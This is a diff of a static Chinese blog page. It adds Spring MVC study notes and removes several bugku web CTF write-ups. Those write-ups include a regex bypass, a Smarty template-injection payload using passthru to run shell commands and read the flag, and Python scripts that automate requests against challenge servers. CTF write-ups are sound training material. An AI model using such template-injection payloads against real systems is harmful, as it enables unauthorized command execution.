+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class RestFulController &#123;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;add&#x2F;&#123;a&#125;&#x2F;&#123;b&#125;&quot;)</span><br><span class="line">    public String test1(@PathVariable int a,@PathVariable  int b, Model model)&#123;</span><br><span class="line">        int res&#x3D;a+b;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;结果为&quot;+res);</span><br><span class="line">        return &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POST请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class RestFulController &#123;</span><br><span class="line">    @RequestMapping(value &#x3D;&quot;&#x2F;add&#x2F;&#123;a&#125;&#x2F;&#123;b&#125;&quot;,method &#x3D; RequestMethod.POST) &#x2F;&#x2F;或者简化成@PostMapping(&quot;&#x2F;add&#x2F;&#123;a&#125;&#x2F;&#123;b&#125;&quot;)</span><br><span class="line">    public String test1(@PathVariable int a,@PathVariable  int b, Model model)&#123;</span><br><span class="line">        int res&#x3D;a+b;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;结果为&quot;+res);</span><br><span class="line">        return &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个就能造成url相同的情况下GET和POST的内容不一样</p>
+<p>转发（url不变，但是会打印目标文件的内容）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller &#x2F;&#x2F;自动被扫描，不用在xml注册了</span><br><span class="line">@RequestMapping(&quot;&#x2F;mvc&quot;)</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;hello&quot;) &#x2F;&#x2F;使用hello请求</span><br><span class="line">    public String hello(Model model) &#123;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;ModelTest1&quot;);</span><br><span class="line">        return &quot;&#x2F;test&quot;;&#x2F;&#x2F;会被视图解析器自动处理，或者return &quot;forward:&#x2F;WEB-INF&#x2F;jsp&#x2F;test.jsp&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重定向（url会变，但是WEB-INF的文件不能被重定向）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller &#x2F;&#x2F;自动被扫描，不用在xml注册了</span><br><span class="line">@RequestMapping(&quot;&#x2F;mvc&quot;)</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;hello&quot;) &#x2F;&#x2F;使用hello请求</span><br><span class="line">    public String hello(Model model) &#123;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;ModelTest1&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;index.jsp&quot;;&#x2F;&#x2F;会被视图解析器自动处理</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>接收请求参数和数据回显：<br>导包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.projectlombok&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;lombok&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.18.22&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>User.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.pojo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import lombok.AllArgsConstructor;</span><br><span class="line">import lombok.Data;</span><br><span class="line">import lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@AllArgsConstructor &#x2F;&#x2F;有参</span><br><span class="line">@NoArgsConstructor &#x2F;&#x2F;无参</span><br><span class="line">public class User &#123;</span><br><span class="line">    private  int id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>UserController.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import com.kuang.pojo.User;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;&#x2F;user&quot;)</span><br><span class="line">public class UserController &#123;</span><br><span class="line">    @GetMapping(&quot;&#x2F;t1&quot;)</span><br><span class="line">    public String test1(String name, Model model)&#123;</span><br><span class="line">        &#x2F;&#x2F;1.接收前端参数</span><br><span class="line">        System.out.println(&quot;接收到前端的参数为：&quot;+name);</span><br><span class="line">        &#x2F;&#x2F;2.将返回的结果传递给前端</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,name);</span><br><span class="line">        &#x2F;&#x2F;3.试图跳转</span><br><span class="line">        return &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;前端接收的是一个对象</span><br><span class="line">    @GetMapping(&quot;t2&quot;)</span><br><span class="line">    public String test2(User user)&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        return &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>访问：<a target="_blank" rel="noopener" href="http://localhost:8080/springmvc_03_annotation_war_exploded/user/t1?name=1">http://localhost:8080/springmvc_03_annotation_war_exploded/user/t1?name=1</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/springmvc_03_annotation_war_exploded/user/t2?user=1&amp;age=2&amp;id=3">http://localhost:8080/springmvc_03_annotation_war_exploded/user/t2?user=1&amp;age=2&amp;id=3</a></p>
+<p>代码不明白就去找官网使用文档，官网使用文档没说就去找它的开源项目，开源项目还没有讲明白就发个issue说“我在这发现了个bug”，很快就会有人和你讲明白</p>
+<p>JSON：<br>前端框架：layui（真就用js写数据库，全都存前端，演示网址：<a target="_blank" rel="noopener" href="https://www.layuiweb.com/demo/index.htm%EF%BC%89">https://www.layuiweb.com/demo/index.htm）</a></p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -211,16 +281,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/20/springMVC%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/14/spring%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">spring笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -239,6 +368,16 @@
 </aside>
 
 
+
+  
+  
+  
+
+  
+
+  
+
+  
 
 
     <section id="comments" style="margin:10px;padding:10px;background:#fff;">
@@ -263,871 +402,6 @@
 
     </section>
   
-  
-    <article id="post-bugku-web-字符？正则？" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/">bugku-web-字符？正则？</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/" class="archive-article-date">
-  	<time datetime="2021-08-10T11:16:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;flag&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>关于正则表达式，建议用这个网站——<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a><br>(可以现场看各种字符是什么意思，虽然是纯英文界面)<br>关于<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>的解释：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.                                  匹配除 &quot;\n&quot; 之外的任何单个字符</span><br><span class="line"></span><br><span class="line">*                                 匹配它前面的表达式0次或多次，等价于&#123;0,&#125;</span><br><span class="line"></span><br><span class="line">&#123;4,7&#125;                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</span><br><span class="line"></span><br><span class="line">\&#x2F;                                匹配 &#x2F; ，这里的 \ 是为了转义</span><br><span class="line"></span><br><span class="line">[a-z]                           匹配所有小写字母</span><br><span class="line"></span><br><span class="line">[:punct:]                     匹配任何标点符号</span><br><span class="line"></span><br><span class="line">&#x2F;i                                表示不分大小写</span><br></pre></td></tr></table></figure>
-<p>所以我随便配了一个：key1key1234key:/1/1keya!</p>
-<p>得到flag</p>
-<img src="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-聪明的php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">bugku-web-聪明的php</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/" class="archive-article-date">
-  	<time datetime="2021-08-09T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开以后发现是php代码，随便传值发现会打印形参和实参</p>
-<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/1.PNG" class="" title="1.PNG">
-
-<p>盲猜是模板注入，试了一下<code>a=&#123;&#123;2*2&#125;&#125;</code><br>发现真的回显为4</p>
-<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/3.PNG" class="" title="3.PNG">
-
-<p>有人是用tplmap扫了一下，发现是smarty构架，然后使用<code>&#123;if php代码&#125;&#123;/if&#125;</code>运行php程序<br>又因为很多命令执行被过滤了，所以只能用passthru()函数（过滤eval的同时会过滤``）<br>传入<code>｛if paathru(&#39;ls&#39;)&#125;&#123;/if&#125;</code>,发现可以执行，顺势tac出flag就好了</p>
-<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/5.PNG" class="" title="5.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-速度要快" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/">bugku-web-速度要快</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/" class="archive-article-date">
-  	<time datetime="2021-08-09T12:59:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>直接开源码，提示OK ,now you have to post the margin what you find<br>意思是以post方式传一个margin</p>
-<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/1.PNG" class="" title="1.PNG">
-<p>抓包发现一个base64，解码</p>
-<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/2.PNG" class="" title="2.PNG">
-
-<p>提交的时候发现不行，结合题目，上脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import bs4,requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:19535&#x2F;&#39;#指定url</span><br><span class="line">req2&#x3D;requests.Session()#开启一个会话</span><br><span class="line">ht &#x3D; req2.get(url)</span><br><span class="line">temp &#x3D; base64.b64decode(ht.headers[&#39;flag&#39;]).decode()#base64解码请求头中的flag参数</span><br><span class="line">flag&#x3D;temp.replace(&quot;跑的还不错，给你flag吧: &quot;,&quot;&quot;)#把修饰语删除</span><br><span class="line">flag&#x3D;base64.b64decode(flag).decode()#竟然还要解码一次！！！不看wp真没想到ε&#x3D;(´ο｀*)))唉</span><br><span class="line">d&#x3D;&#123;&quot;margin&quot;:flag&#125;#构造post数据</span><br><span class="line">r &#x3D; req2.post(url, data&#x3D;d)#data属性提交post参数</span><br><span class="line">print(r.text)#打印</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
-<img src="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-秋名山车神" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">bugku-web-秋名山车神</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/" class="archive-article-date">
-  	<time datetime="2021-08-09T12:53:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后发现要几秒内算题</p>
-<img src="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/1.PNG" class="" title="1.PNG">
-
-<p>直接上python脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests #&#x2F;&#x2F;引入request库</span><br><span class="line">import re 		#&#x2F;&#x2F;引入re库</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;114.67.246.176:13403&#x2F;&#x2F;&#39;&#39;&#39;</span><br><span class="line">s &#x3D; requests.session()  #&#x2F;&#x2F;用session会话保持表达式是同一个</span><br><span class="line">retuen &#x3D; s.get(url)</span><br><span class="line">equation &#x3D; re.search(r&#39;(\d+[+\-*])+(\d+)&#39;, retuen.text).group()</span><br><span class="line"></span><br><span class="line">result &#x3D; eval(equation)	#&#x2F;&#x2F;eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">key &#x3D; &#123;&#39;value&#39;:result&#125;</span><br><span class="line">print(s.post(url, data &#x3D; key).text)</span><br></pre></td></tr></table></figure>
-<p>（当时做的我是找不到了，现在是直接粘的网上的，实测可以，但是要多来几次）<br>得到flag</p>
-<img src="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-成绩查询" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">bugku-web-成绩查询</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/" class="archive-article-date">
-  	<time datetime="2021-08-09T12:35:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
